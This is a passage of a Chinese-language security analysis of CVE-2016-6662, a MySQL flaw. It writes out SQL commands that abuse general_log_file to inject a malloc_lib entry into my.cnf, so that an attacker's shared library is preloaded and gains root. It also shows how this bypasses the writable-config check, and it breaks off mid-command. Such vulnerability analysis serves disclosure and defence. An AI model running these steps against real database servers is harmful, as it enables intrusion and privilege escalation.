# 【技术分享】CVE-2016-6662：Mysql远程代码执行/权限提升技术分析正式版（9/13 10:47更新）
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
作者：[苦逼司马](http://bobao.360.cn/member/contribute?uid=116160120)（凌晨四点收到投稿，感谢作者连夜编辑技术分析）
稿费：800RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**引用**
* * *
【技术分享】CVE-2016-6662-MySQL ‘malloc_lib’变量重写命令执行分析
【漏洞预警】Mysql代码执行漏洞，可本地提权（含exp，9/13 01点更新）
  * Discovered by: Dawid Golunski
  * [http://legalhackers.com](http://legalhackers.com)
  * dawid (at) legalhackers.com
  * CVE-2016-6662
  * Release date: 12.09.2016
  * Severity: Critical
## I. VULNERABILITY
MySQL  chown mysql /etc/my.cnf"
如果mysql用户有mysql配置文件的所属权限，攻击可以追加恶意的配置项，如下所示：
    root@debian:~/# ls -l /etc/my.cnf 
    -rw-r--r-- 1 mysql mysql 72 Jul 28 17:20 /etc/my.cnf
    root@debian:~/# cat /etc/my.cnf 
    [mysqld]
    key_buffer = 16M
    max_allowed_packet = 16M
攻击者可以运行下面的SQL查询:
    mysql> set global general_log_file = '/etc/my.cnf';
    mysql> set global general_log = on;
    mysql> select '
    '> 
    '> ; injected config entry
    '> 
    '> [mysqld]
    '> malloc_lib=/tmp/mysql_exploit_lib.so
    '> 
    '> [separator]
    '> 
    '> ';
    1 row in set (0.00 sec)
    mysql> set global general_log = off;
然后配置文件将增加如下的部分：
    root@debian:~/# cat /etc/my.cnf 
    [mysqld]
    key_buffer = 16M
    max_allowed_packet = 16M
    /usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
    Tcp port: 3306 Unix socket: /var/run/mysqld/mysqld.sock
    Time Id Command Argument
    160728 17:25:14 40 Query    select '
    ; injected config entry
    [mysqld]
    malloc_lib=/tmp/mysql_exploit_lib.so
    [separator]
    '
    160728 17:25:15 40 Query    set global general_log = off
这个配置将会让mysql启动失败，因为该文件中包含一些冗余的信息，然而最重要的部分是mysql配置文件包含了以下部分：
    [mysqld]
    malloc_lib=/tmp/mysql_exploit_lib.so
在mysqld守护进程启动之前，mysqldsafe将正确的读取共享库的路径，并把它添加到LDPRELOAD环境变量。然后预装库的fopen()函数在mysqld守护进程启动之前处理和清理配置文，为的是mysql能够正常启动。
**2，在mysql数据目录中创建新的配置文件，通过默认方式安装mysql的话，mysql用户默认对此目录是有可写权限的，因此不需要依靠不当的权限配置。**
mysqldsafe脚本的分析表明，在除上文中提到的配置文件位置之外，在mysql5.5、5.6版本中mysqldsafe在默认情况下还会从mysql的数据目录(/var/lib/mysql/my.cnf)加载配置文件，如下：
    ----[ /usr/bin/mysqld_safe ]----    [...]
    # Try where the binary installs put it
    if test -d $MY_BASEDIR_VERSION/data/mysql
    then
    DATADIR=$MY_BASEDIR_VERSION/data
    if test -z "$defaults" -a -r "$DATADIR/my.cnf"
    then
    defaults="--defaults-extra-file=$DATADIR/my.cnf"
    fi
    [...]
    ----------[ eof ]---------------
从mysql 5.7开始移除了这个功能，然而在很多配置中，任然是从如下位置加载配置文件：  
/var/lib/mysql/.my.cnf
mysql用户是有mysql数据目录(/var/lib/mysql)写权限的:
    root@debian:~# ls -ld /var/lib/mysql/
    drwx------ 4 mysql mysql 4096 Jul 28 06:41 /var/lib/mysql/
因此，如果没有所属mysql用户的配置文件，攻击者可能仍然能够利用此漏洞在如下位置创建配置文件：  
/var/lib/mysql/my.cnf /var/lib/mysql/.my.cnf
正如前文提到的，用file权限创建这样的文件：
SELECT '恶意配置内容' INTO OUTFILE '/var/lib/mysql/my.cnf'
是行不通的，因为通过这种方式创建的文件权限如下：
    -rw-rw-rw- 1 mysql mysql 4 Jul 28 07:46 /var/lib/mysql/my.cnf
**mysql在启动的时候会组织这种全部可写的配置，但是攻击者利用该漏洞可以绕过这个限制：**
    mysql> set global general_log_file = '/var/lib/mysql/my.cnf';
    mysql> set global general_log = on;
    mysql> select '
        '> 
        '> ; injected config entry